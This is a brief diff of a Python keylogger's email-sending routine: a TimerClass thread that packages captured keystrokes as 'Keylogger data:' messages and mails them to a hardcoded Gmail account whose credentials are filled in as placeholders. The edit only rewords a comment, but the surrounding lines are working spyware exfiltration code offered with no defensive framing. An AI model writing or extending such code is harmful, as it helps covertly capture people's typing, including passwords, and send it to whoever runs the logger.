@@ -47,7 +47,7 @@ class TimerClass(threading.Thread):
                 USER="address@gmail.com"		# Specify Username Here 
                 PASS="prettyflypassword"	    	# Specify Password Here
                 FROM = USER
-                TO = ["address@gmail.com"] 		# Specify to address. Use comma if more than one to address is needed.
+                TO = ["address@gmail.com"] 		# Use comma if more than one to address is desired.
                 SUBJECT = "Keylogger data: "+str(ts)
                 MESSAGE = data
                 message = """\ From: %s To: %s Subject: %s %s """ % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
